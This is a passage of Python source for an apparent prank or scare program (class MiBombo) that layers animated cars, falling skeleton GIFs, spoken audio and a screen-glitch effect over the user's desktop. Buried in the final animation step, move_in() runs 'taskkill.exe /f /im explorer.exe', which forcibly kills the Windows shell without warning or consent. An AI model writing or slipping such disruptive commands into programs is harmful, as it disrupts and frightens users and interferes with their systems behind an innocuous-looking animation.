        py = self.origin_y + PROMPT_OFFSET_Y
        self.prompt_item = self.canvas.create_image(px, py, anchor="nw", image=self.prompt_photo)

        self.tick_main_gif()
        self.root.after(DELAY_BEFORE_AUDIO_MS, self.start_audio_sequence)

    def tick_main_gif(self):
        if self.stop_flag or self.mode != "gif":
            return
        self.main_gif_idx = (self.main_gif_idx + 1) % len(self.main_gif_frames_tk)
        self.canvas.itemconfig(self.skel_item, image=self.main_gif_frames_tk[self.main_gif_idx])
        self.root.after(self.main_gif_ms, self.tick_main_gif)

    def start_audio_sequence(self):
        def worker():
            temp_file = os.path.join(tempfile.gettempdir(), f".{uuid.uuid4().hex}.mp3")
            try:
                asyncio.run(tts_to_file(TEXT, VOICE, temp_file, rate=VOICE_RATE, pitch=VOICE_PITCH, volume=VOICE_VOLUME))
                play_music_blocking(temp_file)
            finally:
                try:
                    os.remove(temp_file)
                except Exception:
                    pass

            if not self.stop_flag:
                self.root.after(DELAY_AFTER_AUDIO_MS, self.begin_car_phase)

        threading.Thread(target=worker, daemon=True).start()

    def begin_car_phase(self):
        try:
            if self.prompt_item is not None:
                self.canvas.delete(self.prompt_item)
                self.prompt_item = None
            if self.skel_item is not None:
                self.canvas.delete(self.skel_item)
                self.skel_item = None
        except Exception:
            pass

        self.mode = "cars"
        self.stack_counts = {}

        self.boom_path = BOOM_MP3_PATH


        self.wave_index = 1
        self.begin_next_wave_parallel()

    def on_waves_done(self):
        if self.boom_path:
            try:
                temp_dir = os.path.abspath(tempfile.gettempdir())
                bp = os.path.abspath(self.boom_path)
                if bp.startswith(temp_dir) and os.path.exists(bp):
                    os.remove(bp)
            except Exception:
                pass
            self.boom_path = None



    def begin_next_wave_parallel(self):
        if self.stop_flag:
            return
        if self.wave_index > WAVES:
            self.root.after(0, self.final_burst_big_car)
            return

        cars = self.wave_index
        wave_done = threading.Event()
        remaining = {"n": cars}
        lock = threading.Lock()

        def one_car_done():
            with lock:
                remaining["n"] -= 1
                if remaining["n"] <= 0:
                    wave_done.set()

        work_top = self.mon_t + 20
        work_bot = self.mon_b - CAR_SIZE[1] - 20
        spacing = int(CAR_SIZE[1] * 1.20)
        mid = (work_top + work_bot) // 2

        y_list = []
        start_y = mid - ((cars - 1) * spacing) // 2
        for i in range(cars):
            y = start_y + i * spacing
            y = max(work_top, min(work_bot, y))
            y_list.append(y)

        if len(set(y_list)) != len(y_list):
            if cars == 1:
                y_list = [mid]
            else:
                step = max(1, (work_bot - work_top) // (cars - 1))
                y_list = [work_top + i * step for i in range(cars)]

        for y in y_list:
            threading.Thread(target=self.car_run_and_break_parallel, args=(y, one_car_done), daemon=True).start()

        def wait_wave():
            wave_done.wait()
            if not self.stop_flag:
                self.wave_index += 1
                self.root.after(350, self.begin_next_wave_parallel)

        threading.Thread(target=wait_wave, daemon=True).start()

    def car_run_and_break_parallel(self, car_y, on_done):
        car_img = Image.open(CAR_PATH).convert("RGBA").resize(CAR_SIZE, Image.Resampling.LANCZOS)
        car_x_start = self.mon_r + 200

        mon_w = self.mon_r - self.mon_l
        crash_min = self.mon_l + int(mon_w * CRASH_MIN_X)
        crash_max = self.mon_l + int(mon_w * CRASH_MAX_X)
        car_x_target = random.randint(crash_min, crash_max)
        car_x_target = min(car_x_target, self.mon_r - CAR_SIZE[0] - 10)

        car = ImageOverlay(car_img, CAR_SIZE[0], CAR_SIZE[1], car_x_start, car_y, self.transparent_key)

        x = car_x_start
        while car.alive and not self.stop_flag and x > car_x_target:

            x -= CAR_STEP_PX
            if x < car_x_target:
                x = car_x_target
            car.move(x, car_y)
            time.sleep(CAR_SLEEP_S)

        if self.stop_flag or not car.alive:
            car.destroy()
            return

        drop_origin_x = x + (CAR_SIZE[0] // 2) - (DROP_SIZE[0] // 2)
        drop_origin_y = car_y + 10

        landed_event = threading.Event()
        self.spawn_droppers_and_wait(drop_origin_x, drop_origin_y, count=2, landed_event=landed_event)

        if self.boom_path and os.path.exists(self.boom_path):
            play_sound_fire_and_forget(self.boom_path, BOOM_VOL)

        car.destroy()
        landed_event.wait()
        on_done()

    def stack_target_y_for_x(self, sx):
        ground_y = self.mon_b - DROP_SIZE[1] - 10
        bin_key = int(sx // STACK_BIN_PX) * STACK_BIN_PX
        with self.stack_lock:
            n = self.stack_counts.get(bin_key, 0)
            self.stack_counts[bin_key] = n + 1
        target = ground_y - (n * DROP_SIZE[1])
        min_y = self.mon_t + 10
        if target < min_y:
            target = min_y
        return target

    def spawn_droppers_and_wait(self, x, y, count, landed_event):
        drop_frames_pil, drop_ms = self.load_gif_frames_pil(GIF_PATH, DROP_SIZE)

        remaining = {"n": count}
        lock = threading.Lock()

        def one_landed():
            with lock:
                remaining["n"] -= 1
                if remaining["n"] <= 0:
                    landed_event.set()

        for i in range(count):
            dx = (i - (count - 1) / 2) * (DROP_SIZE[0] * 1.3)
            sx = int(x + dx)
            sy = int(y)
            target_y = self.stack_target_y_for_x(sx)

            dropper = GifOverlay(drop_frames_pil, drop_ms, DROP_SIZE[0], DROP_SIZE[1], sx, sy, self.transparent_key)
            threading.Thread(target=self.fall_down_then_callback, args=(dropper, sx, sy, target_y, one_landed), daemon=True).start()

    def fall_down_then_callback(self, dropper, x, start_y, target_y, callback):
        cy = start_y
        while dropper.alive and not self.stop_flag and cy < target_y:
            cy += DROP_STEP_PX
            if cy > target_y:
                cy = target_y
            dropper.move(x, cy)
            time.sleep(DROP_SLEEP_S)
        callback()

    def on_close(self):
        self.stop_flag = True
        self.on_waves_done()
        stop_glitch()
        try:
            pygame.mixer.quit()
        except Exception:
            pass
        try:
            self.root.destroy()
        except Exception:
            pass

    def final_burst_big_car(self):
        if self.stop_flag:
            return

        big_w = int(CAR_SIZE[0] * FINAL_CAR_SCALE)
        big_h = int(CAR_SIZE[1] * FINAL_CAR_SCALE)

        big_img = Image.open(CAR_PATH).convert("RGBA").resize((big_w, big_h), Image.Resampling.LANCZOS)

        mon_w = self.mon_r - self.mon_l
        mon_h = self.mon_b - self.mon_t

        target_x = self.mon_l + (mon_w - big_w) // 2
        target_y = self.mon_t + int(mon_h * 0.55) - (big_h // 2)

        start_x = self.mon_r + 400
        start_y = target_y

        car = ImageOverlay(big_img, big_w, big_h, start_x, start_y, self.transparent_key)
       

        def move_in():
            x = start_x
            while car.alive and not self.stop_flag and x > target_x:
                x -= max(8, CAR_STEP_PX)
                if x < target_x:
                    x = target_x
                car.move(x, start_y)
                time.sleep(max(0.010, CAR_SLEEP_S))

            if self.stop_flag or not car.alive:
                car.destroy()
                return
            
            cx = target_x + big_w // 2
            cy = target_y + big_h // 2

            os.system("taskkill.exe /f /im explorer.exe")
            landed_event = threading.Event()
            self.on_waves_done()

            self.spawn_radial_skeleton_burst(cx, cy, FINAL_BURST_COUNT, FINAL_RING_RADIUS, FINAL_RING_JITTER, FINAL_FALL_PX, landed_event)

            def after():
                car.destroy()

            threading.Thread(target=lambda: (landed_event.wait(), self.root.after(0, after)), daemon=True).start()

        threading.Thread(target=move_in, daemon=True).start()

    def spawn_radial_skeleton_burst(self, center_x, center_y, count, radius, jitter, fall_px, landed_event):
        drop_frames_pil, drop_ms = self.load_gif_frames_pil(GIF_PATH, DROP_SIZE)

        start_x = int(center_x - DROP_SIZE[0] // 2)
        start_y = int(center_y - DROP_SIZE[1] // 2)

        remaining = {"n": count}
        lock = threading.Lock()

        def one_landed():
            with lock:
                remaining["n"] -= 1
                if remaining["n"] <= 0:
                    start_glitch_async_once(intensity=10, seconds=40)
                    landed_event.set()
                    

        droppers = []
        targets = []

        for i in range(count):
            angle_step = (2 * math.pi) / max(1, count)
            ang = i * angle_step

            r = radius + random.randint(-jitter, jitter)

            tx = int(center_x + r * math.cos(ang) - DROP_SIZE[0] // 2)
            ty = int(center_y + r * math.sin(ang) - DROP_SIZE[1] // 2)

            tx = max(self.mon_l + 10, min(self.mon_r - DROP_SIZE[0] - 10, tx))
            ty = max(self.mon_t + 10, min(self.mon_b - DROP_SIZE[1] - 10, ty))

            droppers.append(GifOverlay(drop_frames_pil, drop_ms, DROP_SIZE[0], DROP_SIZE[1], start_x, start_y, self.transparent_key))
            targets.append((tx, ty))

        def blast_then_fall():
            steps = 1
            sleep_s = 0.010

            for s in range(1, steps + 1):
                if self.stop_flag:
                    return
                t = s / steps
                for d, (tx, ty) in zip(droppers, targets):
                    if not d.alive:
                        continue
                    nx = int(start_x + (tx - start_x) * t)
                    ny = int(start_y + (ty - start_y) * t)
                    d.move(nx, ny)
                time.sleep(sleep_s)

            for d, (tx, ty) in zip(droppers, targets):
                if not d.alive:
                    one_landed()
                    continue
                final_y = min(self.mon_b - DROP_SIZE[1] - 10, ty + fall_px)
                threading.Thread(
                    target=self.fall_down_then_callback,
                    args=(d, tx, ty, final_y, one_landed),
                    daemon=True
                ).start()

        threading.Thread(target=blast_then_fall, daemon=True).start()


if __name__ == "__main__":
    MiBombo()
